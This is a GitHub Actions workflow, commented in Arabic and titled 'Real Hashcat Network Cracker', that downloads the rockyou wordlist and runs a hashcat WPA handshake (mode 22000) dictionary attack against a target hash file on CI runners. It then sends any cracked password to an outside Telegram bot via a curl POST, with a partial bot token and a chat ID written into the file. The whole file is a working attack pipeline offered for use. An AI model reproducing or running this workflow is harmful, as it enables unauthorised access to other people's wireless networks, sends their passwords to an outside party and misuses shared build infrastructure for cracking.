name: Real Hashcat Network Cracker

on:
  workflow_dispatch:

jobs:
  crack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Tools
        run: |
          sudo apt-get update
          sudo apt-get install -y hashcat curl

      - name: Download Wordlist
        run: |
          # تحميل قاموس rockyou المباشر
          curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

      - name: Locate Hash File & Run Hashcat
        run: |
          # البحث عن ملف الهاش سواء كان في الجذر أو داخل مجلد workflows
          HASH_FILE="target_hash.hc22000"
          if [ -f ".github/workflows/target_hash.hc22000" ]; then
            HASH_FILE=".github/workflows/target_hash.hc22000"
          fi

          echo "Using Hash File at: $HASH_FILE"
          
          # تشغيل التخمين
          hashcat -m 22000 "$HASH_FILE" rockyou.txt --potfile-path=result.txt || true

      - name: Send Telegram Notification
        run: |
          BOT_TOKEN="3865820650:AAEscv13G-..." # ضع التوكن كاملاً هنا
          CHAT_ID="6044239374"

          if [ -s result.txt ]; then
            PASSWORD=$(cat result.txt | awk -F':' '{print $NF}')
            MSG="✅ *تم كسر الهاش بنجاح!*%0A%0A🔑 *كلمة السر هي:* \`$PASSWORD\`"
          else
            MSG="❌ *انتهى الفحص ولم يتم العثور على كلمة السر داخل القاموس.*"
          fi

          curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
            -d "chat_id=${CHAT_ID}" \
            -d "text=${MSG}" \
            -d "parse_mode=Markdown"
